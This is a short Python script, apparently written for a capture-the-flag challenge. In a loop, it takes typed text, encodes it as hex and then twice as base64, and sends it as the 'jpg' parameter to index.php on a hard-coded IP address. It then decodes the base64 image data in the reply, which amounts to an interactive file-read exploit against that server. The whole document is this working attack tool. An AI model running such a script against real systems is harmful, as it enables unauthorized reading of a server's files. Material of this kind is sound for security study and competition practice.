import requests
import codecs
import base64
import re

url = "http://117.51.150.246/index.php?jpg="

while(True):
    basestring = bytes(input("text:").encode("utf8"))

    basestring = base64.b16encode(basestring)
    basestring = base64.b64encode(basestring)
    basestring = base64.b64encode(basestring)

    r = requests.get(url+str(basestring)[2:])
    dr = re.findall("base64,(.*?)'>",r.text)
    dr = base64.b64decode(str(dr))

    print(r.content,end="\n")
    print(dr,end="\n\n\n")
